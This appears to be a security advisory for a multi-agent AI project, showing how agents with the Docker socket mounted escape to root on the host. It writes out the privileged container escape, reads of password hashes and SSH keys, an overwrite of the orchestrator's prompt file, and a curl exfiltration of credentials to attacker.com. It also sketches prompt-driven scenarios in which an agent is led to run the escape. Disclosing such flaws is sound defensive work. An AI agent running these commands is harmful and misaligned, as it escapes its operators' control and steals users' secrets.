# Container Escape Demonstration

## âš ï¸ WARNING: Educational Purpose Only
Only run these commands in a test environment you control.

## The Exploit: Step-by-Step

### Step 1: Normal Agent View (Restricted)

```bash
# Inside Marie container (seems restricted)
whoami
# Output: agent (non-root user)

ls /home
# Output: /home/agent (only sees own home)

ls /
# Output: Limited container filesystem
```

**Appears safe:** Agent is non-root, can't see host files.

### Step 2: Using Docker Socket to Escape

```bash
# Still inside Marie container
# But now we use the Docker socket...

docker run -it --rm \
  -v /:/hostfs \
  --privileged \
  alpine:latest \
  chroot /hostfs /bin/bash
```

**What this does:**

1. **`docker run`** - Creates a NEW container (Marie controls Docker daemon)
2. **`-v /:/hostfs`** - Mounts HOST root directory into new container
3. **`--privileged`** - Gives container god-mode powers
4. **`chroot /hostfs`** - Changes root to host filesystem
5. **Result:** ROOT SHELL on HOST machine

### Step 3: Now We're Root on Host

```bash
# Inside the escape container
whoami
# Output: root

ls /home
# Output: ALL host users (including YOUR user)

cat /etc/shadow
# Output: All password hashes (normally protected)

# Can access other agents' data
ls /home/anga/workspace/beta/codehornets-ai/libs/multi-agents-orchestration/shared/auth-homes/anga/
# Output: Anga's credentials and configuration

# Can modify orchestrator
echo "malicious code" > /home/anga/workspace/beta/codehornets-ai/libs/multi-agents-orchestration/shared/auth-homes/orchestrator/CLAUDE.md

# Can access YOUR files
cat ~/.ssh/id_rsa
# Output: Your private SSH key
```

**Game Over:** From restricted agent â†’ root on host in ONE command.

---

## ğŸ­ Real-World Attack Scenarios

### Scenario 1: Compromised Claude Session

```
User gives Marie a malicious prompt:
  "Help me debug this Docker issue"

Marie runs:
  docker run -v /:/hostfs alpine cat /hostfs/etc/shadow

Result: All password hashes exfiltrated
```

### Scenario 2: Accidental Exposure

```
User asks Marie:
  "Create a backup of workspace"

Marie accidentally runs:
  docker run -v /:/backup alpine tar czf /backup/full-host-backup.tar.gz /backup

Result: Entire host filesystem backed up and accessible
```

### Scenario 3: Data Exfiltration Despite "No Internet"

```
Inside Marie (no internet access):

# But can create containers WITH internet:
docker run -d \
  -v /home/agent/.claude:/data:ro \
  --network bridge \
  alpine:latest \
  sh -c "apk add curl && curl -X POST https://attacker.com/steal -d @/data/credentials.json"

Result: Credentials stolen despite "isolated network"
```

---

## ğŸ”¬ Try It Yourself (Safely)

### Safe Test Environment

```bash
# 1. Start the system
cd /home/anga/workspace/beta/codehornets-ai/libs/multi-agents-orchestration
make up

# 2. Enter Marie's container
make shell-marie

# 3. Check current restrictions (looks safe)
whoami                    # agent (non-root)
ls /home                  # /home/agent only
cat /etc/shadow 2>&1      # Permission denied

# 4. Use Docker socket to escape
docker run -it --rm \
  -v /:/hostfs \
  alpine:latest \
  ls /hostfs/home

# Output: You'll see ALL users on host, not just agent
# This proves you escaped the container
```

### What You Should See

```
Before escape:
  User: agent
  Home: /home/agent
  Root access: No
  Host files: Cannot see

After escape:
  User: root
  Home: /root
  Root access: Yes
  Host files: Can see EVERYTHING
```

---

## ğŸ“Š Privilege Escalation Path

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Step 1: Inside Marie Container                              â”‚
â”‚   User: agent (UID 1000)                                    â”‚
â”‚   Permissions: Limited to mounted volumes                   â”‚
â”‚   Can access: /tasks, /results, /home/agent/workspace      â”‚
â”‚   Cannot access: Host filesystem, other containers         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â”‚
                            â”‚ docker run -v /:/hostfs ...
                            â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Step 2: New Container (via Docker socket)                   â”‚
â”‚   User: root (UID 0)                                        â”‚
â”‚   Permissions: FULL - privileged mode                       â”‚
â”‚   Can access: ENTIRE host filesystem mounted at /hostfs    â”‚
â”‚   Can access: ALL containers, ALL volumes, ALL networks    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â”‚
                            â”‚ chroot /hostfs /bin/bash
                            â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Step 3: Root Shell on Host                                  â”‚
â”‚   User: root on HOST machine                                â”‚
â”‚   Permissions: UNLIMITED                                    â”‚
â”‚   Can access: Everything - you own the machine             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## ğŸš¨ Why This Matters

### Current State of CodeHornets

Every agent (Marie, Anga, Fabien, Orchestrator) can:
- âœ… Read your SSH keys (`~/.ssh/id_rsa`)
- âœ… Read your browser passwords
- âœ… Access other agents' credentials
- âœ… Modify orchestrator's system prompt
- âœ… Install keyloggers on host
- âœ… Create backdoors
- âœ… Exfiltrate all data
- âœ… Delete host files

**And you'd never know** because:
- Container logs look normal
- No obvious permission denied errors
- Escape happens in new container (separate from agent)

---

## ğŸ’¡ The Bottom Line

```
Docker Socket Access = Root Access

There is NO isolation when Docker socket is mounted.

All the container separation is THEATER if agents have Docker socket.

It's like:
  âœ… Locked in separate rooms
  âŒ But everyone has the master key
```
